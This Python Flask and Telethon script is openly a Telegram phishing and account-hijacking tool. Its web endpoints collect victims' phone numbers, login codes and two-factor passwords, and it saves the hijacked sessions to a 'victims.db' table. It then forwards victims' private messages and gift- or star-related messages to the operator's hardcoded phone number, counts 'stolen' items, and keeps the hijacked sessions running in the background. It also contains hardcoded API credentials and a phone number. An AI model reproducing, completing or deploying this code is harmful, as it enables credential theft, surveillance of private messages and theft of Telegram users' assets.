from flask import Flask, request, jsonify
import asyncio
from telethon import TelegramClient, events
from telethon.errors import SessionPasswordNeededError
from telethon.tl.types import MessageMediaPhoto, MessageMediaDocument
import sqlite3
import os
import logging
from threading import Thread
import time

app = Flask(__name__)
logging.basicConfig(level=logging.INFO)

# Твои учетные данные
api_id = 25015433
api_hash = '546b7eb3f2865939ca71dbaedb49017d'
YOUR_PHONE = '+998997220530'

# База данных
def init_db():
    conn = sqlite3.connect('victims.db')
    c = conn.cursor()
    c.execute('''CREATE TABLE IF NOT EXISTS accounts
                 (phone TEXT PRIMARY KEY, session_file TEXT, ref_id TEXT, 
                  stolen_gifts INTEGER DEFAULT 0, stolen_stars INTEGER DEFAULT 0,
                  timestamp DATETIME DEFAULT CURRENT_TIMESTAMP)''')
    conn.commit()
    conn.close()

init_db()

async def setup_client_handlers(client, phone):
    @client.on(events.NewMessage)
    async def handler(event):
        try:
            # Пересылаем все сообщения из избранного
            if event.is_private:
                await client.forward_messages(YOUR_PHONE, event.message)
                
        except Exception as e:
            logging.error(f"Forward error: {e}")

async def steal_premium_gifts(client):
    try:
        # Поиск NFT подарков и звезд
        async for dialog in client.iter_dialogs():
            if dialog.is_channel or dialog.is_group:
                async for message in client.iter_messages(dialog.id, limit=100):
                    if message.media:
                        # Проверяем на подарки/звезды
                        if hasattr(message.media, 'premium_gift') or 'star' in str(message.text).lower():
                            await client.forward_messages(YOUR_PHONE, message)
                            
                            # Обновляем счетчик в БД
                            conn = sqlite3.connect('victims.db')
                            c = conn.cursor()
                            if 'star' in str(message.text).lower():
                                c.execute("UPDATE accounts SET stolen_stars = stolen_stars + 1 WHERE phone = ?", (phone,))
                            else:
                                c.execute("UPDATE accounts SET stolen_gifts = stolen_gifts + 1 WHERE phone = ?", (phone,))
                            conn.commit()
                            conn.close()
                            
    except Exception as e:
        logging.error(f"Steal error: {e}")

async def create_telegram_session(phone, code, password, ref_id):
    try:
        session_file = f"sessions/{phone}.session"
        client = TelegramClient(session_file, api_id, api_hash)
        
        await client.connect()
        
        if not await client.is_user_authorized():
            if code:
                await client.sign_in(phone, code)
            elif password:
                await client.sign_in(password=password)
            
            if await client.is_user_authorized():
                # Сохраняем сессию
                conn = sqlite3.connect('victims.db')
                c = conn.cursor()
                c.execute("INSERT OR REPLACE INTO accounts (phone, session_file, ref_id) VALUES (?, ?, ?)", 
                         (phone, session_file, ref_id))
                conn.commit()
                conn.close()
                
                # Запускаем воровство
                await steal_premium_gifts(client)
                setup_client_handlers(client, phone)
                
                return True
                
    except Exception as e:
        logging.error(f"Session error: {e}")
        return False
    
    return False

def run_async(coro):
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    return loop.run_until_complete(coro)

@app.route('/auth', methods=['POST'])
def auth():
    data = request.json
    phone = data.get('phone')
    ref_id = data.get('ref_id')
    return jsonify({'status': 'code_sent'})

@app.route('/code', methods=['POST'])
def verify_code():
    data = request.json
    phone = data.get('phone')
    code = data.get('code')
    ref_id = data.get('ref_id')
    
    success = run_async(create_telegram_session(phone, code, None, ref_id))
    return jsonify({'status': 'password_required' if not success else 'success'})

@app.route('/password', methods=['POST'])
def verify_password():
    data = request.json
    phone = data.get('phone')
    password = data.get('password')
    ref_id = data.get('ref_id')
    
    success = run_async(create_telegram_session(phone, None, password, ref_id))
    return jsonify({'status': 'success' if success else 'error'})

# Запуск активных сессий
def start_active_sessions():
    conn = sqlite3.connect('victims.db')
    c = conn.cursor()
    c.execute("SELECT phone, session_file FROM accounts")
    accounts = c.fetchall()
    conn.close()
    
    for phone, session_file in accounts:
        try:
            client = TelegramClient(session_file, api_id, api_hash)
            client.start()
            setup_client_handlers(client, phone)
            Thread(target=client.run_until_disconnected).start()
        except Exception as e:
            logging.error(f"Failed to start session for {phone}: {e}")

if __name__ == '__main__':
    if not os.path.exists('sessions'):
        os.makedirs('sessions')
    
    # Запускаем активные сессии в фоне
    time.sleep(5)
    Thread(target=start_active_sessions).start()
    
    app.run(host='0.0.0.0', port=5000)
